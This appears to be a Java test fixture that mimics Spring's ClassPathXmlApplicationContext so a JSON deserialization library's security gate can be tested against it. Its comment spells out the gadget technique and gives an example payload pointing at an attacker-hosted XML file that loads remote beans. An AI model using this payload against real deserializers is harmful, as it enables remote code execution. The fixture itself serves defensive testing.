package org.springframework.context.support;

import org.springframework.context.ApplicationContext;

/**
 * Stand-in for Spring's {@code ClassPathXmlApplicationContext}, shaped like the real one in the two
 * ways that made it exploitable:
 * <ol>
 *     <li>a <b>varargs</b> {@code String... configLocations} constructor — the varargs branch of
 *         named-parameter matching widens a single JSON string into a {@code String[1]}, so a payload
 *         of {@code {"configLocations":"http://attacker/evil.xml"}} matches every parameter; and</li>
 *     <li>a constructor <b>side effect</b> — the real one calls {@code refresh()}, which fetches the
 *         attacker's URL and instantiates the beans it declares, entirely outside java-util's
 *         security gate. {@link #refreshed} stands in for that.</li>
 * </ol>
 * The class is compiled with {@code -parameters} (as Spring's own jars are), so the reflective
 * parameter name {@code configLocations} really is discoverable — without that, name matching would
 * bail out and the test would pass for the wrong reason.
 */
public class ClassPathXmlApplicationContext implements ApplicationContext {
    /** Set iff a constructor ran — i.e. iff the security gate was bypassed. */
    public static volatile String refreshed;

    public ClassPathXmlApplicationContext(String... configLocations) {
        refreshed = configLocations != null && configLocations.length > 0 ? configLocations[0] : "<empty>";
    }

    public ClassPathXmlApplicationContext() {
        refreshed = "<no-arg>";
    }
}
